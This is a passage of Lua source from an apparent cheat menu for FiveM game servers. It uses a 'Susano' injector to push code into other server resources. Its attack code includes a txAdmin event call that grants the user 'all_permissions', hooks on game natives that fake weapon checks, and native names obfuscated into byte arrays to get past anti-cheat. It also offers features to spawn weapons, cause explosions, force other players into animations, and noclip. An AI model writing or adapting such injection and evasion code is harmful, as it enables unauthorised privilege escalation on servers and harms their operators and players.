                    if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                        sSeEtTvVbBn(_veh, ShiftBoostSpeed + 0.0)
                    end
                end
                fFfGgGgHhIi(0)
            end
        end)
    end
    ZxCvBnMmLl()
]], "monitor")


Utils.RegisterScript("deleteVehicle", [[
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)

    if veh ~= 0 then
        DeleteVehicle(veh)
        DeleteEntity(veh)
    end
]])

Utils.RegisterScript("startVehicleEngine", [[
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)

    if veh ~= 0 then
        SetVehicleEngineOn(veh, true, true, false)
    end
]])

------------------------------------------
Utils.RegisterScript("txAdmin:setMode", [[
TriggerEvent("txcl:setPlayerMode", %s, %s)
]], "any")

Utils.RegisterScript("txAdmin:setAdmin", [[
TriggerEvent("txcl:setAdmin", "Sus", {"all_permissions"}, "")
]], "any")

-- Teleport
Utils.RegisterScript("tpToWaypoint", [[
    if not IsWaypointActive() then return end

    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    local waypoint = GetFirstBlipInfoId(GetWaypointBlipEnumId())
    local destCoords = GetBlipInfoIdCoord(waypoint)

    FreezeEntityPosition(ped, true)
    SetPedCoordsKeepVehicle(ped, destCoords.x, destCoords.y, destCoords.z)

    local startZ = destCoords.z
    RequestCollisionAtCoord(destCoords.x, destCoords.y, startZ)

    while not HasCollisionLoadedAroundEntity(ped) do
        Citizen.Wait(100)
    end

    local groundFound, groundZ
    local maxUp = 10000.0
    local maxDown = 200.0
    local step = 5.0

    for dz = maxUp, -maxDown, -step do
        groundFound, groundZ = GetGroundZFor_3dCoord(destCoords.x, destCoords.y, startZ + dz, false)
        if groundFound and groundZ then
            destCoords = vector3(destCoords.x, destCoords.y, groundZ + 1.0)
            break
        end
        Citizen.Wait(0)
    end

    if not groundFound then
        destCoords = vector3(destCoords.x, destCoords.y, startZ + 1.0)
    end

    SetPedCoordsKeepVehicle(ped, destCoords.x, destCoords.y, destCoords.z)

    FreezeEntityPosition(ped, false)
]], {"monitor"})

Utils.RegisterScript("teleportToCoords", [[
    local ped = PlayerPedId()
    local destCoords = {x= %s, y= %s, z= %s}

    FreezeEntityPosition(ped, true)
    SetPedCoordsKeepVehicle(ped, destCoords.x, destCoords.y, destCoords.z)

    local startZ = destCoords.z
    RequestCollisionAtCoord(destCoords.x, destCoords.y, startZ)

    while not HasCollisionLoadedAroundEntity(ped) do
        Citizen.Wait(100)
    end

    local groundFound, groundZ
    local maxUp = 10000.0
    local maxDown = 200.0
    local step = 5.0

    for dz = maxUp, -maxDown, -step do
        groundFound, groundZ = GetGroundZFor_3dCoord(destCoords.x, destCoords.y, startZ + dz, false)
        if groundFound and groundZ then
            destCoords = vector3(destCoords.x, destCoords.y, groundZ + 1.0)
            break
        end
        Citizen.Wait(0)
    end

    if not groundFound then
        destCoords = vector3(destCoords.x, destCoords.y, startZ + 1.0)
    end

    SetPedCoordsKeepVehicle(ped, destCoords.x, destCoords.y, destCoords.z)

    FreezeEntityPosition(ped, false)
]], {"monitor"})

function SpawnVehicleByModel(vehicleModel, ply, coords)
    local can_i_spawn, reason_cant = CIST:canISpawn("Vehicle", vehicleModel)
    if not can_i_spawn then return print("Cant spawn car! " .. reason_cant) end

    print("Spawnin car", vehicleModel)

    local ped = ply or PlayerPedId()
    local pedCoords = coords or GetEntityCoords(ped)
    local pedHeading = GetEntityHeading(ped)

    if GetResourceState("es_extended") == "started" and
        GetResourceState("ReaperV4") ~= "started" then
        Susano.InjectResource("es_extended", string.format([[
            local VehicleModel = "%s"
            local targetPed = %d
            local spawnCoords = vector3(%f, %f, %f)
            local spawnHeading = %f

            ESX.Game.SpawnVehicle(VehicleModel, spawnCoords, spawnHeading, function(vehicle)
                if vehicle then
                    TaskWarpPedIntoVehicle(targetPed, vehicle, -1)
                end
            end)
        ]], vehicleModel, ped, pedCoords.x, pedCoords.y, pedCoords.z, pedHeading))
    else
        Susano.InjectResource("monitor", string.format([[
        print("Hiasd")
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function g(n)
            return _G[decode(n)]
        end

        local function wait(n)
            return Citizen.Wait(n)
        end

        local enc_natives = {
            fn_f9 = {68,111,101,115,69,110,116,105,116,121,69,120,105,115,116},
            fn_g3 = {71,101,116,72,97,115,104,75,101,121},
            fn_g5 = {82,101,113,117,101,115,116,77,111,100,101,108},
            fn_g6 = {72,97,115,77,111,100,101,108,76,111,97,100,101,100},
            fn_g10 = {67,114,101,97,116,101,86,101,104,105,99,108,101},
            fn_h5 = {73,115,77,111,100,101,108,73,110,67,100,105,109,97,103,101},
            fn_h6 = {73,115,77,111,100,101,108,65,86,101,104,105,99,108,101},
            fn_i1 = {83,101,116,86,101,104,105,99,108,101,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121},
            fn_i2 = {83,101,116,86,101,104,105,99,108,101,78,101,101,100,115,84,111,66,101,72,111,116,119,105,114,101,100},
            fn_i3 = {83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,79,110},
            fn_i4 = {83,101,116,86,101,104,105,99,108,101,68,111,111,114,115,76,111,99,107,101,100},
            fn_i5 = {83,101,116,86,101,104,105,99,108,101,72,97,115,66,101,101,110,79,119,110,101,100,66,121,80,108,97,121,101,114}
        }

        local VehicleModel = "%s"
        local targetPed = %d
        local spawnX = %f
        local spawnY = %f
        local spawnZ = %f
        local spawnHeading = %f

        local newModel = g(enc_natives.fn_g3)(VehicleModel)
        if not (g(enc_natives.fn_h5)(newModel) and g(enc_natives.fn_h6)(newModel)) then return end

        -- Request and load model
        local hash = g(enc_natives.fn_g3)(VehicleModel)
        g(enc_natives.fn_g5)(hash)
        while not g(enc_natives.fn_g6)(hash) do wait(0) end

        -- Spawn vehicle at specified ped position
        local vehicle = g(enc_natives.fn_g10)(hash, spawnX, spawnY, spawnZ + 0.5, spawnHeading, true, true, true)
        if vehicle and g(enc_natives.fn_f9)(vehicle) then
            -- Set vehicle properties
            g(enc_natives.fn_i1)(vehicle)
            g(enc_natives.fn_i2)(vehicle, false)
            g(enc_natives.fn_i3)(vehicle, true, true, false)
            g(enc_natives.fn_i4)(vehicle, 1)
            g(enc_natives.fn_i5)(vehicle, true)
        end
    ]], vehicleModel, ped, pedCoords.x, pedCoords.y, pedCoords.z, pedHeading))
    end
end

Utils.RegisterScript("giveWeapons", [[
    local huh = %s
    local playerPed = PlayerPedId()
    local weaponHash = GetHashKey(huh)
    GiveWeaponToPed(playerPed, weaponHash, 250, false, true)
]], {"ox_inventory", "any"})

Utils.RegisterScript("giveMaxAmmo", [[
    local playerPed = PlayerPedId()
    SetPedInfiniteAmmoClip(playerPed, false)

    for i = 0, 49 do
        local weaponHash = GetHashKey(GetWeapontypeGroup(i))
        if HasPedGotWeapon(playerPed, weaponHash, false) then
            SetPedAmmo(playerPed, weaponHash, 9999)
        end
    end

    local currentWeapon = GetSelectedPedWeapon(playerPed)
    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
        SetPedAmmo(playerPed, currentWeapon, 9999)
    end
]], "monitor")

Utils.RegisterScript("setInfiniteAmmo", [[
    local toggle = %s
    local playerPed = PlayerPedId()

    _G.INFINITE_AMMO_ACTIVE = toggle

    if toggle then
        SetPedInfiniteAmmoClip(playerPed, true)
        CreateThread(function()
            while _G.INFINITE_AMMO_ACTIVE do
                local currentWeapon = GetSelectedPedWeapon(playerPed)
                if currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedAmmo(playerPed, currentWeapon, 9999)
                end
                Wait(100)
            end
        end)
    else
        SetPedInfiniteAmmoClip(playerPed, false)
    end
]], "monitor")

Utils.RegisterScript("setNoReload", [[
    local toggle = %s

    _G.NO_RELOAD_ACTIVE = toggle

    if toggle then
        CreateThread(function()
            while _G.NO_RELOAD_ACTIVE do
                local playerPed = PlayerPedId()
                local currentWeapon = GetSelectedPedWeapon(playerPed)
                if currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                    local _, maxAmmo = GetMaxAmmo(playerPed, currentWeapon)
                    local clipSize = GetMaxAmmoInClip(playerPed, currentWeapon, true)
                    if clipSize and clipSize > 0 then
                        SetAmmoInClip(playerPed, currentWeapon, clipSize)
                    end
                end
                Wait(0)
            end
        end)
    end
]], "monitor")

Utils.RegisterScript("setOneShotKill", [[
    local toggle = %s

    _G.ONE_SHOT_KILL_ACTIVE = toggle

    if toggle then
        CreateThread(function()
            while _G.ONE_SHOT_KILL_ACTIVE do
                local playerPed = PlayerPedId()
                SetPlayerWeaponDamageModifier(PlayerId(), 1000.0)
                SetPlayerMeleeWeaponDamageModifier(PlayerId(), 1000.0)
                Wait(0)
            end
            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), 1.0)
        end)
    else
        SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
        SetPlayerMeleeWeaponDamageModifier(PlayerId(), 1.0)
    end
]], "monitor")

Utils.RegisterScript("setExplosiveAmmo", [[
    local toggle = %s

    _G.EXPLOSIVE_AMMO_ACTIVE = toggle

    if toggle then
        CreateThread(function()
            while _G.EXPLOSIVE_AMMO_ACTIVE do
                local playerPed = PlayerPedId()
                local hasShot, coords = GetPedLastWeaponImpactCoord(playerPed)

                if hasShot then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 1.0, true, false, 0.5)
                end

                Wait(0)
            end
        end)
    end
]], "monitor")

Utils.RegisterScript("spawnObject", [[
    local model = %s
    local spawnCoords = vector3(%s, %s, %s)
    local explode = %s

    if GetCurrentResourceName() == "es_extended" then
        RequestModel(model)
        while not HasModelLoaded(model) do Wait(0) end

        ESX.Game.SpawnObject(model, spawnCoords, function(spawnedObj)
            if not spawnedObj or not DoesEntityExist(spawnedObj) then return end
            local obj = spawnedObj

            NetworkRegisterEntityAsNetworked(obj)
            local netId = ObjToNet(obj)
            SetNetworkIdExistsOnAllMachines(netId, true)
            SetNetworkIdCanMigrate(netId, true)

            PlaceObjectOnGroundProperly(obj)
            SetEntityVisible(obj, false, false)
            SetEntityCollision(obj, false, false)
            FreezeEntityPosition(obj, true)

            if explode then
                local pos = GetEntityCoords(obj)
                local fireIds = {}
                local offsets = {
                    {0.0, 0.0, 0.0},
                    {0.35, 0.0, 0.0},
                    {-0.35, 0.0, 0.0},
                    {0.0, 0.35, 0.0},
                    {0.0, -0.35, 0.0},
                }

                for i=1, #offsets do
                    local off = offsets[i]
                    local id = StartScriptFire(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                    if id and id ~= -1 then
                        fireIds[#fireIds+1] = id
                    end
                end

                local entFire = StartEntityFire(obj)

                local timeout = GetGameTimer() + 10000
                while GetGameTimer() < timeout and DoesEntityExist(obj) do
                    Wait(200)
                end

                for i=1, #fireIds do
                    RemoveScriptFire(fireIds[i])
                end

                if entFire and entFire ~= -1 then
                    RemoveScriptFire(entFire)
                end
                StopEntityFire(obj)
            end

            if DoesEntityExist(obj) then
                DeleteObject(obj)
            end

            SetModelAsNoLongerNeeded(model)
        end)
    else
        RequestModel(model)
        while not HasModelLoaded(model) do Wait(0) end

        local obj = CreateObjectNoOffset(model, spawnCoords.x, spawnCoords.y, spawnCoords.z - 1.0, true, true, false)
        if not DoesEntityExist(obj) then return end

        NetworkRegisterEntityAsNetworked(obj)
        local netId = ObjToNet(obj)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)

        PlaceObjectOnGroundProperly(obj)
        SetEntityVisible(obj, false, false)
        SetEntityCollision(obj, false, false)
        FreezeEntityPosition(obj, true)

        if explode then
            local pos = GetEntityCoords(obj)
            local fireIds = {}
            local offsets = {
                {0.0, 0.0, 0.0},
                {0.35, 0.0, 0.0},
                {-0.35, 0.0, 0.0},
                {0.0, 0.35, 0.0},
                {0.0, -0.35, 0.0},
            }

            for i=1, #offsets do
                local off = offsets[i]
                local id = StartScriptFire(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                if id and id ~= -1 then
                    fireIds[#fireIds+1] = id
                end
            end

            local entFire = StartEntityFire(obj)

            local timeout = GetGameTimer() + 10000
            while GetGameTimer() < timeout and DoesEntityExist(obj) do
                Wait(200)
            end

            for i=1, #fireIds do
                RemoveScriptFire(fireIds[i])
            end

            if entFire and entFire ~= -1 then
                RemoveScriptFire(entFire)
            end
            StopEntityFire(obj)
        end

        if DoesEntityExist(obj) then
            DeleteObject(obj)
        end

        SetModelAsNoLongerNeeded(model)
    end
]], {"es_extended", "any"})

Utils.RegisterScript("shootWeapon", [[
    local weaponModel = %s
    local targetCoords = vector3(%s, %s, %s)
    local spawnCoords = vector3(%s or 0, %s or 0, %s or 0)

    local weaponHash = GetHashKey(weaponModel)
    local playerPed = PlayerPedId()

    local fromX = spawnCoords.x
    local fromY = spawnCoords.y
    local fromZ = spawnCoords.z + 40.0

    local toX, toY, toZ
    if spawnCoords.x == 0 and spawnCoords.y == 0 and spawnCoords.z == 0 then
        toX = targetCoords.x
        toY = targetCoords.y
        toZ = targetCoords.z + 0.2
    else
        toX = spawnCoords.x
        toY = spawnCoords.y
        toZ = spawnCoords.z
    end

    ShootSingleBulletBetweenCoords(fromX, fromY, fromZ, toX, toY, toZ, 1, true, weaponHash, playerPed, true, false, -1.0)
]], "any")

function ForceHandsUp(enabled, targetServerId)
    _G.forceHandsUpEnabled = enabled
    _G.forceHandsUpTargetId = enabled and targetServerId or nil

    if enabled then
         Susano.InjectResource("any", string.format([[
            local function findClientIdByServerId(sid)
                local players = GetActivePlayers()
                for _, pid in ipairs(players) do
                    if GetPlayerServerId(pid) == sid then
                        return pid
                    end
                end
                return -1
            end

            local function ForceHandsUpOnPlayer(ped)
                local dict = "missminuteman_1ig_2"
                local anim = "handsup_base"

                if not HasAnimDictLoaded(dict) then
                    RequestAnimDict(dict)
                    while not HasAnimDictLoaded(dict) do
                        Wait(10)
                    end
                end

                TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
            end

            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            if clientId ~= -1 then
                local targetPed = GetPlayerPed(clientId)
                if targetPed and DoesEntityExist(targetPed) then
                    ForceHandsUpOnPlayer(targetPed)
                end
            end

            _G.forceHandsUpEnabled = true
            _G.forceHandsUpTargetId = %d

            CreateThread(function()
                while _G.forceHandsUpEnabled and _G.forceHandsUpTargetId == %d do
                    Wait(100)
                    local clientId = findClientIdByServerId(%d)
                    if clientId ~= -1 then
                        local targetPed = GetPlayerPed(clientId)
                        if targetPed and DoesEntityExist(targetPed) then
                            if not IsEntityPlayingAnim(targetPed, "missminuteman_1ig_2", "handsup_base", 3) then
                                ForceHandsUpOnPlayer(targetPed)
                            end
                        end
                    end
                end
            end)
        ]], targetServerId, targetServerId, targetServerId, targetServerId))
    else
        Susano.InjectResource("any", [[
            _G.forceHandsUpEnabled = false
            _G.forceHandsUpTargetId = nil
        ]])
    end
end

function SpawnWeapon(weapon)
    if not weapon or weapon == "" then
        return
    end

    Susano.HookNative(0x3A87E44BB9A01D54,
        function(ped, weaponHash)
            return false, -1569615261
        end)

    Susano.HookNative(0x3795688A307E1EB6, function(ped)
        return false, false
    end)

    Susano.HookNative(0x0A6DB4965674D243, function(ped)
        return false,-1569615261
    end)

    Susano.HookNative(0xC3287EE3050FB74C,
        function(weaponHash)
            return false,-1569615261
        end)

    Susano.HookNative(0x475768A975D5AD17, function(ped, p1)
        return false,false
    end)

    Susano.HookNative(0x8DECB02F88F428BC,
        function(ped, weaponHash, p2)
            return false,false
        end)

    Susano.HookNative(0x34616828CD07F1A1, function(ped)
        return false,false
    end)

    Susano.HookNative(0x3A50753042A63901, function(ped)
        return false,false
    end)

    Susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1)
        return false,false
    end)

    Susano.HookNative(0x4899CB088EDF3BCC,
        function(ped, weaponHash, p2)
            return false,false
        end)

    Susano.HookNative(0xB2A38826EAB6BCF1, function(ped)
        return false,false
    end)

    Susano.HookNative(0xED958C9C056BF401, function(ped)
        return false,false
    end)

    Susano.HookNative(0x8483E98E8B888A2D, function(ped, p1)
        return false,-1569615261
    end)

    Susano.HookNative(0xA38DCFFCE89696FA,
        function(ped, weaponHash)
            return false,0
        end)

    Susano.HookNative(0x7FEAD38B326B9F74,
        function(ped, weaponHash)
            return false,0
        end)

    Susano.HookNative(0x3B390A939AF0B5FC,
        function(ped)
            return false,-1
        end)

    Susano.HookNative(0x59DE03442B6C9598,
        function(weaponHash)
            return false,-1569615261
        end)

    Susano.HookNative(0x3133B907D8B32053,
        function(weaponHash, componentHash)
            return false,0.3
        end)

    Susano.HookNative(0x97A790315D3831FD, function(entity)
        return false,0
    end)

    Susano.HookNative(0x48C2BED9180FE123, function(entity)
        return false,false
    end)

    Susano.HookNative(0x89CF5FF3D310A0DB,
        function(weaponHash)
            return false,-1569615261
        end)

    Susano.HookNative(0x24B600C29F7F8A9E, function(ped)
        return false,false
    end)

    Susano.HookNative(0x3A87E44BB9A01D54, function(ped, weaponHash) -- GetSelectedPedWeapon
        return false,-1569615261 -- WEAPON_UNARMED
    end)

    Susano.HookNative(0x8DECB02F88F428BC, function(ped, weaponHash) -- HasPedGotWeapon
        return false,false
    end)

    Susano.HookNative(0x3B390A939AF0B5FC, function(ped) -- GetAmmoInPedWeapon
        return false,0
    end)

    Susano.HookNative(0xF489B44DD5AF4BD9, function(ped, weaponHash) -- GetWeaponClipSize
        return false,0
    end)

    Susano.HookNative(0x015A522136D7F951, function(ped, weaponHash) -- GetMaxAmmo
        return false,0
    end)

    Susano.HookNative(0xA38DCFFCE89696FA, function(ped, weaponHash) -- GetAmmoInClip
        return false,0
    end)

    if CheckResource("ox_inventory") then
        Susano.InjectResource("ox_inventory", [[
            local _GetCurrentPedWeapon = GetCurrentPedWeapon
            local _RemoveAllPedWeapons = RemoveAllPedWeapons
            local _RemoveWeaponFromPed = RemoveWeaponFromPed
            local _SetCurrentPedWeapon = SetCurrentPedWeapon
            local _GetSelectedPedWeapon = GetSelectedPedWeapon
            
            GetSelectedPedWeapon = function(ped)
                 return GetHashKey("WEAPON_UNARMED")
            end

            GetCurrentPedWeapon = function(ped, ...)
                return true, GetHashKey("WEAPON_UNARMED")
            end

            RemoveAllPedWeapons = function(ped, ...) return end

            RemoveWeaponFromPed = function(ped, weapon) return end

            SetCurrentPedWeapon = function(ped, weapon, ...)
                if weapon == GetHashKey("WEAPON_UNARMED") then
                    return _SetCurrentPedWeapon(ped, weapon, ...)
                end
                return
            end
		    exports.ox_inventory:weaponWheel(true)
		]])
    end


    local weaponName = weapon

    local success, error = pcall(function()
        Susano.InjectResource("any", string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return _g(_b("Wait"))(n)
        end

        local function _t()
            return _g(_b("CreateThread"))
        end

        local function GiveWeapon()
            local ped = _g(_b("PlayerPedId"))()
            local hash = _g(_b("GetHashKey"))("%s")
            local give = _g(_b("GiveDelayedWeaponToPed"))
            give(ped, hash, 250, true, true)
        end

        GiveWeapon()
    ]], weaponName))
    end)


    if not success then
    end
end

function GiveWeapon(weaponName)
    SpawnWeapon(weaponName)
end

_G.CurrentSelectedFreeCam = 1
local FreeCamFeatures = {
    [1] = {
        name = "View",
        callback = function(entityHit, endCoords, camCoords) end
    },
    [2] = {
        name = "Teleport",
        callback = function(entityHit, endCoords, camCoords)
            Utils.InjectScript("teleportToCoords", nil, endCoords.x,
                               endCoords.y, endCoords.z)
        end
    },
    [3] = {
        name = "Explosion",
        callback = function(entityHit, endCoords, camCoords)
            Utils.InjectScript("spawnObject", nil, "prop_aircon_m_04",
                               endCoords.x, endCoords.y, endCoords.z, true)
        end
    },
    [4] = {
        name = "Spawn Vehicle",
        callback = function(entityHit, endCoords, camCoords)
            SpawnVehicleByModel(_G.FreeCamVehicle or "adder", nil, endCoords)
        end
    },
    [5] = {
        name = "Shoot Weapon",
        callback = function(entityHit, endCoords, camCoords)
            Utils.InjectScript("shootWeapon", nil,
                               _G.FreeCamWeapon or "weapon_pistol", endCoords.x,
                               endCoords.y, endCoords.z, 0, 0, 0)
        end
    }
}

-- spawnObject

Susano.Communication.register("freeCamHit", function(...)
    FreeCamFeatures[CurrentSelectedFreeCam].callback(...)
end)
local ScreenWidth, ScreenHeight = GetActiveScreenResolution()

Susano.HookNative(0x1CEA6BFDF248E5D9, function() return false, true end)

function ToggleFreeCam()
    _G.FreeCam = not _G.FreeCam
    CreateThread(function()
        while _G.FreeCam do
            if IsDisabledControlJustPressed(0, 242) then
                _G.CurrentSelectedFreeCam = _G.CurrentSelectedFreeCam + 1
                if _G.CurrentSelectedFreeCam > #FreeCamFeatures then
                    _G.CurrentSelectedFreeCam = 1
                end
            elseif IsDisabledControlJustPressed(0, 241) then
                _G.CurrentSelectedFreeCam = _G.CurrentSelectedFreeCam - 1
                if _G.CurrentSelectedFreeCam < 1 then
                    _G.CurrentSelectedFreeCam = #FreeCamFeatures
                end
            end

            Susano.BeginFrame()
            local lineHeight = 25
            local startY = ScreenHeight - 100 - (#FreeCamFeatures * lineHeight)

            local MenuFont = THEME["Fonts"]["MenuText"]

            for i = 1, #FreeCamFeatures do
                local feature = FreeCamFeatures[i]
                local yPos = startY + ((i - 1) * lineHeight)

                -- Calculate position at bottom middle of screen
                local textH = 22
                local textWidth = Susano.GetTextWidthWithFont(feature.name,
                                                              MenuFont[1],
                                                              MenuFont[2], textH)
                local xPos = (ScreenWidth / 2) - (textWidth / 2)
                local yPos = ScreenHeight - 100 -
                                 ((#FreeCamFeatures - i) * lineHeight)

                if i == _G.CurrentSelectedFreeCam then
                    -- Highlighted selected item
                    local selectedText = "> " .. feature.name
                    local selectedWidth =
                        Susano.GetTextWidthWithFont(selectedText, MenuFont[1],
                                                    MenuFont[2], textH)
                    xPos = (ScreenWidth / 2) - (selectedWidth / 2)
                    Susano.DrawTextWithFont(xPos, yPos, selectedText,
                                            MenuFont[1], MenuFont[2], textH, 0,
                                            1, 0, 1)
                else
                    -- Normal item
                    Susano.DrawTextWithFont(xPos, yPos, feature.name,
                                            MenuFont[1], MenuFont[2], textH, 1,
                                            1, 1, 1)
                end
            end

            Susano.SubmitFrame()

            Wait(0)
        end

        Susano.ResetAllFrames()
    end)

    Susano.Communication.Inject("monitor", [[
    _G.TX_FCamActiveFF = TX_FCamActiveFF or false
    local camera = nil
    _G.speed = _G.speed or 0.5
    local fov = 85.0

    function IJOASDHNWHUIASD()
        TX_FCamActiveFF = not TX_FCamActiveFF

        if TX_FCamActiveFF then
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)

            camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true) -- refactor to CreateCamWithParams?
            SetCamCoord(camera, coords.x, coords.y, coords.z)
            SetCamRot(camera, 0.0, 0.0, heading, 2)
            SetCamFov(camera, fov)
            RenderScriptCams(true, false, 0, true, true)

            DisableAllControlActions(0)
        else
            RenderScriptCams(false, false, 0, true, true)
            DestroyCam(camera, false)
            camera = nil

            EnableAllControlActions(0)

            local playerCoords = GetEntityCoords(PlayerPedId())
            RequestCollisionAtCoord(playerCoords.x, playerCoords.y, playerCoords.z)
            SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
        end
    end

    local function GetCamDirection(cam)
        local rot = GetCamRot(cam, 2)
        local radX = math.rad(rot.x)
        local radZ = math.rad(rot.z)

        return vector3(
            -math.sin(radZ) * math.abs(math.cos(radX)),
            math.cos(radZ) * math.abs(math.cos(radX)),
            math.sin(radX)
        )
    end

    CreateThread(function()
        while TX_FCamActiveFF do
            Wait(0)

            if TX_FCamActiveFF and camera then
                DisableAllControlActions(0)

                local camCoords = GetCamCoord(camera)
                local camRot = GetCamRot(camera, 2)
                local mouseX = GetDisabledControlNormal(0, 1) * 5.0
                local mouseY = GetDisabledControlNormal(0, 2) * 5.0
                local newRotX = camRot.x - mouseY
                local newRotZ = camRot.z - mouseX

                if newRotX > 89.0 then newRotX = 89.0 end
                if newRotX < -89.0 then newRotX = -89.0 end

                SetCamRot(camera, newRotX, 0.0, newRotZ, 2)

                local forward = GetCamDirection(camera)
                local right = vector3(forward.y, -forward.x, 0.0)


                local moveSpeed = speed
                if IsDisabledControlPressed(0, 21) then moveSpeed = speed * 2.0 end

                if IsDisabledControlPressed(0, 32) then
                    camCoords = camCoords + (forward * moveSpeed)
                end
                if IsDisabledControlPressed(0, 33) then
                    camCoords = camCoords - (forward * moveSpeed)
                end
                if IsDisabledControlPressed(0, 34) then
                    camCoords = camCoords - (right * moveSpeed)
                end
                if IsDisabledControlPressed(0, 35) then
                    camCoords = camCoords + (right * moveSpeed)
                end

                RequestCollisionAtCoord(camCoords.x, camCoords.y, camCoords.z)
                SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)

                local playerCoords = GetEntityCoords(PlayerPedId())
                RequestCollisionAtCoord(playerCoords.x, playerCoords.y, playerCoords.z)

                if IsDisabledControlJustReleased(0, 24) then
                    Wait(10)
                    local camCoords = GetCamCoord(camera)
                    local direction = GetCamDirection(camera)
                    local destination = camCoords + (direction * 1000.0)

                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, destination.x, destination.y, destination.z, -1, -1, 0)
                    local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)

                    if hit then
                        if com and com.call then
                            com.call("freeCamHit", entityHit, endCoords, camCoords)
                        end
                    end
                end

                SetCamCoord(camera, camCoords.x, camCoords.y, camCoords.z)
            end
        end
    end)

    IJOASDHNWHUIASD()
    ]])
end

-- Noclip functions (macho menu style)
function setNoclipSpeed(speed)
    _G.noclipSpeed = speed or 1.0
end

function setNoclipFollowHeading(enabled)
    _G.noclipFollowHeading = enabled and true or false
end

function ToggleInvisibleNoclip(mode)
    local targetResource = InjectResource or "any"
    local code = string.format([[
        invisible_noclip_mode = %d
    ]], mode or 0)
    Susano.InjectResource(targetResource, code)
end

Utils.RegisterScript("setNoclipSpeed", [[
    local speed = tonumber(%s) or 1.0
    if speed < 0.1 then speed = 0.1 end
    _G.noclipSpeed = speed
]], "any")

Utils.RegisterScript("setNoclipFollowHeading", [[
    _G.noclipFollowHeading = %s and true or false
]], "any")

Utils.RegisterScript("setInvisibleNoclipMode", [[
    local mode = tonumber(%s) or 0
    if mode < 0 then mode = 0 end
    if mode > 2 then mode = 2 end
    ToggleInvisibleNoclip(mode)
]], "any")

-- Noclip toggle using macho menu logic (obfuscated)
-- We need to create a custom function since we need to dynamically inject with current speed/heading values
function NoClip()
    _G.WavenoclipActive = not _G.WavenoclipActive
    if _G.WavenoclipActive then
        local targetResource = InjectResource or "any"
        if not targetResource or targetResource == nil then
            if GetResourceState("es_extended") == "started" then
                targetResource = 'es_extended'
            elseif GetResourceState("ox_lib") == "started" then
                targetResource = 'ox_lib'
            elseif GetResourceState("qb-core") == "started" then
                targetResource = 'qb-core'
            elseif GetResourceState("oxmysql") == "started" then
                targetResource = 'oxmysql'
            elseif GetResourceState("monitor") == "started" then
                targetResource = 'monitor'
            else
                targetResource = 'any'
            end
        end
        
        local noclipSpeed = _G.noclipSpeed or 1.0
        local noclipFollowHeading = _G.noclipFollowHeading and true or false
        
        local code = string.format([[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end

            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end

            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function _w(n)
                return _g(_b("Wait"))(n)
            end

            local function _t()
                return _g(_b("CreateThread"))
            end

            if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
            if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
            NpYgTbUcXsRoVm = true

            local function KUQpH7owdz()
                local RvBcNxMzKgUiLo = _g(_b("PlayerPedId"))
                local EkLpOiUhYtGrFe = _g(_b("GetVehiclePedIsIn"))
                local CtVbXnMzQaWsEd = _g(_b("GetEntityCoords"))
                local DrTgYhUjIkOlPm = _g(_b("GetEntityHeading"))
                local QiWzExRdCtVbNm = _g(_b("GetGameplayCamRelativeHeading"))
                local AoSdFgHjKlZxCv = _g(_b("GetGameplayCamRelativePitch"))
                local BpLqMnVxCzAsDf = _g(_b("GetGameplayCamRot"))
                local TyUiOpAsDfGhJk = _g(_b("IsDisabledControlPressed"))
                local WqErTyUiOpAsDf = _g(_b("SetEntityCoordsNoOffset"))
                local PlMnBvCxZaSdFg = _g(_b("SetEntityHeading"))
                local XzQwErTyUiOpAs = _g(_b("SetEntityRotation"))
                local HnJmKlPoIuYtRe = _t()

                local YtReWqAzXsEdCv = true

                HnJmKlPoIuYtRe(function()
                    while NpYgTbUcXsRoVm do
                        _w(0)
                        _G.WavenoclipActive = true

                        if YtReWqAzXsEdCv then
                            local speed = %f
                            local followHeading = %s

                            if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
                            local p = RvBcNxMzKgUiLo()

                            if invisible_noclip_mode == 1 then
                                SetEntityVisible(p, false, 0)
                            elseif invisible_noclip_mode == 2 then
                                SetEntityLocallyVisible(p, false)
                            end
                            local v = EkLpOiUhYtGrFe(p, false)
                            local inVeh = v ~= 0 and v ~= nil
                            local ent = inVeh and v or p

